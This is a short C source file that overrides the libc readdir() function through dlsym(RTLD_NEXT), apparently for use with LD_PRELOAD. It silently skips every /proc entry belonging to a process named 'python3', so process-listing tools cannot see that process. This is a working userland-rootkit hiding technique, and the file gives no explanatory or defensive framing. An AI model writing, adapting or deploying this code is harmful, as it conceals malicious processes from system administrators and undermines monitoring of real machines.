#include <stdio.h>
#include <errno.h>
#include <dirent.h>
#include <error.h>
#define __USE_GNU
#include <dlfcn.h>
#include <string.h>
#include <sys/stat.h>

#define NAME "python3"

static struct dirent *(*old_readdir) (DIR *) = NULL;

struct dirent *readdir (DIR * dirp) {
	if (old_readdir == NULL) {
		old_readdir = dlsym(RTLD_NEXT, "readdir");
		if (old_readdir == NULL) 
			error(1, errno, "dlsym");

		fprintf(stderr, "Catched\n");		
	}
	
	struct dirent * direntp ;
	while (( direntp = old_readdir ( dirp ) ) != NULL ) {

		char proc[300];
		
		struct stat sb;
		sprintf(proc, "/proc/%s", direntp->d_name);
		if (stat(proc, &sb) == -1) break;
		
		int proc_inode = sb.st_ino;
		if (direntp->d_ino != proc_inode) {
			break;
		}
		
		sprintf(proc, "/proc/%s/comm", direntp->d_name);
		FILE *comm;
		comm = fopen(proc, "r");
		if (comm == NULL) break;
		
		char name[80];
		fscanf(comm, "%s", name);
		fclose(comm);
		
		if (strcmp(NAME, name) == 0) continue;
		else break;		
	} 
	return (direntp);
}
